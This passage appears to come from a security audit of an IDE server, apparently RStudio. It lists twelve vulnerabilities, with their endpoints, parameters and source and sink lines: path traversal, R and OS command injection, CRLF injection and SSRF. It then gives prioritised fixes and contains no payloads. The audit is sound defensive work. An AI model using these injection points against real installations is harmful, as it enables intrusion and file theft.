| ID | Endpoint | Parameter | Source | Sink | Type | Severity |
|---|---|---|---|---|---|---|
| VULN-01 | `GET /content` | `file` (query) | `SessionContentUrls.cpp:99` | `:102` | Path Traversal — no containment check | **CRITICAL** |
| VULN-02 | `GET /themes/custom/local/*` | URI path | `SessionThemes.cpp:622` | `:624` | Path Traversal — symlink bypass | **HIGH** |
| VULN-03 | `GET /show/*` | URI path | `SessionFiles.cpp:637` | `:659` | Path Traversal — no guard (desktop) | **HIGH** |
| VULN-04 | `GET /html_preview/*` | URI path | `SessionHTMLPreview.cpp:964` | `setFile()` | Path Traversal — symlink bypass | **HIGH** |
| VULN-05 | `GET /tutorial/run` | `package`, `name` | `SessionTutorial.cpp:174` | `:177` | R param injection — no whitelist | **MEDIUM** |
| VULN-06 | Rmd Knit | `knit:` YAML field | `SessionRMarkdown.R:170` | `SessionRMarkdown.cpp:629` | R Code Injection — unescaped format | **MEDIUM** |
| VULN-07 | JSON-RPC `get_script_run_command` | `interpreter` | `SessionSource.cpp:1560` | `:1606` | R Code Injection — unescaped concat | **MEDIUM** |
| VULN-08 | Electron IPC `desktop_install_rtools` | `version`, `installerPath` | `gwt-callback.ts:975` | `:983` | OS Command Injection via `exec()` | **HIGH (Win)** |
| VULN-09 | `GET /files/<path>` | URI path (`%2e%2e`) | `SessionFiles.cpp:591` | `:607` | Path Traversal — encoding bypass | **HIGH** |
| VULN-10 | `GET /help/*` | `Referer` header | `SessionHelp.cpp:495` | `:497` | CRLF Injection — header injection | **HIGH** |
| VULN-11 | `GET /tutorial/*.png` | URI path | `SessionTutorial.cpp:337` | `:344` | Path Traversal — normalization escape | **HIGH** |
| VULN-12 | JSON-RPC `download_data_file` | `url` param | `SessionDataImport.R:40` | `:44` | SSRF — no URL validation | **MEDIUM** |

---

## 6. Recommendations

| Priority | Fix |
|---|---|
| P0 | **VULN-01**: Replace `completePath()` with `completeChildPath()` in `contentFileInfo()`. |
| P0 | **VULN-09**: In `handleFilesRequest()`, URL-decode the URI before checking for `..`, or use `pathAfterPrefix()` which applies `cleanupPath()` first. |
| P0 | **VULN-11**: In `handleTutorialFileRequest()`, replace `completePath(path)` with `completeChildPath(path)`. If path is absolute, reject it. |
| P1 | **VULN-10**: In `handleHttpdResult()`, replace the direct `setHeader("Location", redirect)` call with `setMovedTemporarily(request, ...)`, or apply `safeLocation()` to the Referer-derived value before use. |
| P1 | **VULN-02/03/04**: Update `isWithin()` to use `boost::filesystem::weakly_canonical()` or POSIX `realpath()` before comparing paths, to eliminate symlink bypass. |
| P1 | **VULN-08**: Replace `exec(command_string)` with `spawn(binary, [args])` using an argument array to prevent shell interpretation. |
| P2 | **VULN-12**: Add URL validation to `download_data_file`: reject non-`http(s)://` schemes, block RFC1918/loopback/link-local ranges, block cloud metadata endpoints. |
| P2 | **VULN-06**: Apply `singleQuotedStrEscape()` to `renderFunc` at `SessionRMarkdown.cpp:629`. |
| P2 | **VULN-07**: Escape `interpreter` for double-quoted R string context in `getScriptRunCommand()`. |
| P3 | **VULN-05**: Validate `package` parameter against `find.packages()` output. |
